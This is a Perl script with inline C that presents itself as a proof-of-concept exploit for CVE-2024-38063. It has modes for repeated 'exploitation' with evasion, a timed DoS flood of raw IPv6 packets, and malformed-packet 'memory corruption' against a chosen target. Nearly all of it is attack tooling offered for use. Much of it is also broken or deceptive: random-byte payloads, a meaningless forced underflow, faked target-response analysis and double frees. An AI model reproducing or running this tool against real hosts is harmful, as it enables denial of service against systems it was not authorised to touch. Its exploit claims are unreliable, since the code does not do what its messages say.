use strict;
use warnings;
use Getopt::Long;
use Term::ANSIColor;
use Net::Frame::Layer::IPv6;
use Net::Frame::Layer::ICMPv6;
use Net::Frame::Simple;
use Net::Pcap;
use threads;
use POSIX qw(strftime);
use Net::IP;
use Net::Ping;
use Inline C => <<'END_C';

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/socket.h>

#define MAX_PACKET_SIZE 1500

// Function to create a complex and powerful payload for CVE-2024-38063
void create_cve_2024_38063_payload(char *payload, size_t length, unsigned short header_length, int attempt, int autoevade, int target_response) {
    srand(time(NULL) + attempt);

    // Introduce variability and potential bad inputs based on target response
    for (size_t i = 0; i < length; i++) {
        payload[i] = (char)(rand() % 256);  // Random bytes throughout
    }

    // Specific exploit manipulation
    unsigned short exploit_value = (unsigned short)((header_length + length) % 65536);
    payload[header_length] = (char)(exploit_value & 0xFF); 
    payload[header_length + 1] = 0x00; // Null byte for termination
    payload[header_length + 2] = (char)(0xFF - exploit_value); // Trigger point

    if (autoevade) {
        // Apply adaptive changes based on the target's response
        for (size_t i = header_length + 3; i < header_length + 20; i++) {
            payload[i] = (target_response % 2 == 0) ? rand() % 256 : (char)(~payload[i]);
        }

        // Adjust header values to attempt evasion techniques
        payload[header_length + 4] = (attempt % 2 == 0) ? 0x3B : 0x06; // Alternate between No Next Header and TCP
    }

    // Guaranteed Integer Underflow - this will force an underflow
    unsigned short underflow_test = header_length;
    underflow_test -= 65535; // This will definitely cause underflow
    payload[header_length + 5] = (char)(underflow_test & 0xFF); // Use the underflowed value in the payload

    // Use the underflowed value in multiple strategic places
    payload[header_length + 10] = (char)(underflow_test >> 8);
    payload[header_length + 15] = (char)((underflow_test & 0xFF) ^ 0xAA); // XOR with 0xAA for added effect

    printf("[+] Payload crafted for attempt %d with exploit value: 0x%02x, auto-evade: %s\n", attempt, exploit_value, autoevade ? "Enabled" : "Disabled");
}

// Function to send the crafted packet to the target
void send_packet(char *target_ip, char *buffer, size_t total_size, int delay) {
    if (total_size > MAX_PACKET_SIZE) {
        printf("[!] Packet size %zu exceeds the maximum allowable size of %d bytes.\n", total_size, MAX_PACKET_SIZE);
        free(buffer);
        return;
    }

    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("[!] \033[1;31mSocket creation failed\033[0m");
        free(buffer);
        return;
    }

    printf("[+] \033[1;32mRaw socket created successfully.\033[0m\n");

    struct sockaddr_in6 dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin6_family = AF_INET6;
    inet_pton(AF_INET6, target_ip, &dest.sin6_addr);

    usleep(delay); // Adjust delay based on strategy

    if (sendto(sock, buffer, total_size, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        perror("[!] \033[1;31mSendto failed\033[0m");
    } else {
        printf("[>] Packet sent to %s with size: %zu bytes.\n", target_ip, total_size);
        printf("[>] Buffer content (first 32 bytes): %.32s\n", buffer);
    }

    close(sock);
    free(buffer);
}

// Function to dynamically exploit the target using CVE-2024-38063
void dynamic_exploit_ipv6(char *target_ip, unsigned short header_length, int max_attempts, int autoevade) {
    printf("[+] \033[1;32mStarting dynamic exploitation on %s with header length %d...\033[0m\n", target_ip, header_length);

    int target_response = 0;

    for (int attempt = 1; attempt <= max_attempts; attempt++) {
        time_t now = time(NULL);
        char *timestamp = ctime(&now);
        timestamp[strlen(timestamp) - 1] = '\0';

        printf("\n[=] \033[1;34mAttempt %d/%d [%s]...\033[0m\n", attempt, max_attempts, timestamp);

        size_t total_size = (1500 - header_length) - (attempt % 100); // Vary size within the MTU
        if (total_size > MAX_PACKET_SIZE) {
            printf("[!] Calculated packet size %zu exceeds maximum allowable size.\n", total_size);
            total_size = MAX_PACKET_SIZE - 1; // Adjust to max allowable size
        }

        printf("[>] Calculated packet size: \033[1;36m%zu bytes\033[0m\n", total_size);

        char *buffer = (char *)malloc(total_size);
        if (buffer) {
            printf("[+] \033[1;32mMemory allocation successful\033[0m for attempt %d, buffer size: %zu bytes.\n", attempt, total_size);

            create_cve_2024_38063_payload(buffer, total_size, header_length, attempt, autoevade, target_response);
            printf("[?] \033[1;36mPayload crafted successfully\033[0m for attempt %d with targeted manipulations.\n", attempt);

            send_packet(target_ip, buffer, total_size, 5000); // Adding delay to adjust attack strategy

            // Simulate target response analysis
            target_response = rand() % 100;
            printf("[?] \033[1;36mAnalyzed target response\033[0m for attempt %d, response value: %d.\n", attempt, target_response);

            printf("[?] \033[1;36mResources cleaned up\033[0m for attempt %d.\n", attempt);
        } else {
            printf("[!] \033[1;31mMemory allocation failed\033[0m on attempt %d; possible mitigation detected.\n", attempt);
            break;
        }
    }

}

// Function to simulate DoS by flooding target with fragmented packets
void flood_target(char *target_ip, int duration) {
    printf("[+] \033[1;31mStarting DoS Flood Attack on %s for %d seconds...\033[0m\n", target_ip, duration);
    
    time_t end_time = time(NULL) + duration;
    
    while (time(NULL) < end_time) {
        size_t total_size = MAX_PACKET_SIZE - 1;
        char *buffer = (char *)malloc(total_size);
        if (buffer) {
            create_cve_2024_38063_payload(buffer, total_size, 40, rand(), 0, rand()); // 40 bytes header length
            
            send_packet(target_ip, buffer, total_size, 1000); // Random delay to enhance flood effectiveness
        } else {
            printf("[!] \033[1;31mMemory allocation failed during DoS Flood attack.\033[0m\n");
            break;
        }
    }

    printf("\n[+] \033[1;32mDoS Flood Attack completed.\033[0m\n");
}

// Function to trigger memory corruption in the TCP/IP stack by crafting malformed packets
void trigger_memory_corruption(char *target_ip, int max_attempts) {
    printf("[+] \033[1;31mStarting memory corruption test on %s...\033[0m\n", target_ip);

    for (int attempt = 1; attempt <= max_attempts; attempt++) {
        printf("\n[=] \033[1;34mMemory Corruption Attempt %d/%d...\033[0m\n", attempt, max_attempts);

        // Crafting malicious packet with potential to cause memory corruption
        size_t total_size = (MAX_PACKET_SIZE - (rand() % 100)) + 1;
        if (total_size > MAX_PACKET_SIZE) {
            total_size = MAX_PACKET_SIZE - 1;
        }

        char *buffer = (char *)malloc(total_size);
        if (buffer) {
            // Filling the buffer with specific patterns that could trigger stack corruption
            memset(buffer, 'A', total_size);
            buffer[total_size - 1] = '\0'; // Null-terminate just for safety

            // Manipulating critical parts of the packet
            buffer[1] = 0x00; // Modify some control fields
            buffer[2] = 0xFF; // Inserting potential overflow points
            buffer[3] = 0xAA; // Inserting another pattern

            // Sending the crafted packet
            send_packet(target_ip, buffer, total_size, 500); // Short delay to accelerate impact

            printf("[>] Crafted packet with size %zu sent.\n", total_size);

            free(buffer);
        } else {
            printf("[!] \033[1;31mMemory allocation failed during memory corruption test.\033[0m\n");
            break;
        }
    }

    printf("\n[+] \033[1;32mMemory corruption test completed.\033[0m\n");
}

END_C

# CLI options
my ($target, $header_length, $exploit, $attempts, $help, $autoevade, $flood, $duration, $autodos, $memcorrupt);

GetOptions(
    'target=s'        => \$target,
    'header_length=i' => \$header_length,
    'exploit'         => \$exploit,
    'attempts=i'      => \$attempts,
    'autoevade'       => \$autoevade,
    'flood'           => \$flood,
    'duration=i'      => \$duration,
    'autodos'         => \$autodos,
    'memcorrupt'      => \$memcorrupt,
    'help'            => \$help,
) or die("[!] Error in command line arguments\n");

# IPv6 validation function using Net::IP
sub is_valid_ipv6 {
    my ($ipv6) = @_;
    my $ip = Net::IP->new($ipv6);
    return ($ip && $ip->version() == 6);
}

# IPv6 reachability check function, with support for link-local addresses
sub is_ipv6_reachable {
    my ($ipv6) = @_;
    my $p = Net::Ping->new("tcp", 1);
    $p->port_number(80);

    # Check if it's a link-local address and specify the interface
    if ($ipv6 =~ /^fe80::/i) {
        # Extract the correct interface using `ip` command, ensuring no unintended text is captured
        my $interface = `ip -6 addr | grep -B2 '$ipv6' | grep -oP '(?<=inet6 ).*(?=/)' | head -n1`;
        $interface = `ip -6 addr | grep -B2 '$ipv6' | head -n1 | awk '{print \$2}' | sed 's/://g'`;
        chomp $interface;
        if ($interface) {
            $p->bind($interface);
            print "[+] Checking reachability on interface $interface...\n";
        } else {
            print "[!] Could not determine the interface for link-local address $ipv6.\n";
            return 0;
        }
    }

    return $p->ping($ipv6);
}

# Validate IPv6 target before proceeding
if ($target) {
    if (!is_valid_ipv6($target)) {
        die "[!] \033[1;31mError: Invalid IPv6 address provided.\033[0m\n";
    }
    
    if (!is_ipv6_reachable($target)) {
        die "[!] \033[1;31mError: IPv6 address is not reachable or IPv6 is not active on the target.\033[0m\n";
    }
}

if ($help || !$target || (!$exploit && !$flood && !$autodos && !$memcorrupt)) {
    print "\n[!] \033[1;33mUsage: $0 --target <target_ip> [--header_length <length>] --exploit [--attempts <number>] [--autoevade] --flood [--duration <seconds>] --autodos --memcorrupt\033[0m\n";
    exit;
}

if ($exploit) {
    if (!$header_length) {
        die("[!] \033[1;31mError: --header_length is required for exploitation phase.\033[0m\n");
    }

    $attempts ||= 1000;  # Increase the number of attempts significantly

    print "\n\033[1;31m[=] Dynamic PoC by Haroon Ahmad Awan [=]\033[0m\n";
    print "[+] \033[1;32mLaunching dynamic exploitation with $attempts attempt(s) on target $target.\033[0m\n";
    if ($autoevade) {
        print "[+] \033[1;32mAuto-evade enabled: Applying mitigation defeat techniques.\033[0m\n";
    }
    threads->create(\&dynamic_exploit_ipv6, $target, $header_length, $attempts, $autoevade)->join();
    print "\n[+] \033[1;32mDynamic exploitation completed.\033[0m\n";
}

if ($flood || $autodos) {
    $duration ||= 60;  # Default duration is 60 seconds
    print "\n[+] \033[1;31mInitiating Flooding Mode for $duration seconds.\033[0m\n";
    threads->create(\&flood_target, $target, $duration)->join();
    print "\n[+] \033[1;32mFlooding Mode completed.\033[0m\n";
}

if ($memcorrupt) {
    $attempts ||= 500;  # Set a default number of attempts for memory corruption

    print "\n[+] \033[1;31mTriggering memory corruption simulation on target $target.\033[0m\n";
    threads->create(\&trigger_memory_corruption, $target, $attempts)->join();
    print "\n[+] \033[1;32mMemory corruption simulation completed.\033[0m\n";
}
